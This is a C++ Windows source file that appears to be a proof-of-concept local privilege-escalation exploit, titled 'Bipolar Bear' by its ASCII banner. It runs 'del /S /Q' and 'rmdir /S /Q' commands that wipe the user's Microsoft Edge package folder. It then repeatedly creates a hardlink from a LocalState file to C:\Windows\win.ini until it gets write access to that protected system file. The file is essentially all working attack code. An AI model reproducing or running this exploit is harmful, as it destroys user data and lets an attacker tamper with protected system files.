#include <windows.h>

#include <comdef.h>
#include "stdafx.h"
#include <iostream>
#include <shlobj.h>
#pragma comment(lib, "shell32.lib")
bool CreateNativeHardlink(LPCWSTR linkname, LPCWSTR targetname);
using namespace std;
bool triggered = false;
bstr_t GetFavDirectory()
{
	LPWSTR lpRet = nullptr;

	if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, nullptr, &lpRet)))
	{
		bstr_t r = lpRet;
		CoTaskMemFree(lpRet);

		return r;
	}

	return L"";
}


int _tmain()
{
	//I'm bad at string stuff loool
	bstr_t path1 = GetFavDirectory() + L"\\packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\*";
	std::string cmd(path1, SysStringLen(path1));
	std::string before = "del \"";
	std::string after = "\" /S /Q";
	before.append(cmd);
	before.append(after);
	LPCSTR cmdw = before.c_str();

	bstr_t pathq1 = GetFavDirectory() + L"\\packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe";
	std::string cmdq(pathq1, SysStringLen(pathq1));
	std::string beforeq = "rmdir /S /Q \"";
	std::string afterq = "\"";
	beforeq.append(cmdq);
	beforeq.append(afterq);
	LPCSTR cmdwq = beforeq.c_str();
	std::cout << std::endl
		<< "/////////////////////////////////////////////////////////" << std::endl
		<< "//¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶//" << std::endl
		<< "//¶¶¶¶¶¶¶¶¶¶¶¶§§§§§§§§¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶//" << std::endl
		<< "//¶¶¶¶¶¶¶¶§1``````````````11§§¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶//" << std::endl
		<< "//¶¶¶¶¶¶1````````````````````````1§§¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶//" << std::endl
		<< "//¶¶¶¶§```````````````````````````````§§¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶//" << std::endl
		<< "//¶¶¶§```````````````````````````````````1§¶¶¶¶¶¶¶¶¶¶¶¶//" << std::endl
		<< "//¶¶§```````````````````````````````````````1§¶¶¶¶¶¶¶¶¶//" << std::endl
		<< "//¶¶``````````BIPOLAR BEAR`````````````````````1§¶¶¶¶¶¶//" << std::endl
		<< "//¶1`1`````````````````````````````````````````1`1¶¶¶¶¶//" << std::endl
		<< "//¶§¶¶§````````````````````````````````````````````1§¶¶//" << std::endl
		<< "//¶¶¶`§§```````````````````````````````````````````§¶¶¶//" << std::endl
		<< "//¶¶1``1§````````````````````````111§§¶¶¶¶¶¶§§§¶¶¶¶¶¶¶¶//" << std::endl
		<< "//¶¶````1§`````````````````````1§§¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶//" << std::endl
		<< "//¶§``````§````````11`````````§§``1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶//" << std::endl
		<< "//¶``````1¶¶```````¶¶¶¶1`````¶1````¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶//" << std::endl
		<< "//¶`````§¶¶¶¶1`````¶¶¶¶§````¶¶1````1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶//" << std::endl
		<< "//§````§¶¶¶¶¶¶````1¶¶¶¶§````¶¶¶`````¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶//" << std::endl
		<< "//¶````§¶¶¶¶¶¶````1¶¶¶¶§````¶¶¶¶````1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶//" << std::endl
		<< "//¶¶111`11¶¶¶¶1``````1¶¶§````1§¶¶1````11¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶//" << std::endl
		<< "//¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶//" << std::endl
		<< "/////////////////////////////////////////////////////////" << std::endl;
	std::cout << std::endl << "---------------------------------BIPOLAR BEAR SALUTES YOU------------------------------------------------------------" << std::endl;
		system(cmdw);
		system(cmdwq);
		HANDLE Thread = GetCurrentThread();
		SetThreadPriority(Thread, THREAD_PRIORITY_ABOVE_NORMAL);
		HANDLE test = 0;
		do {
			 CreateNativeHardlink(GetFavDirectory() + L"\\packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\localstate\\bear3.txt", L"C:\\Windows\\win.ini");
			 test = CreateFile(L"c:\\windows\\win.ini", GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		} while (test == INVALID_HANDLE_VALUE);
return 0;
}





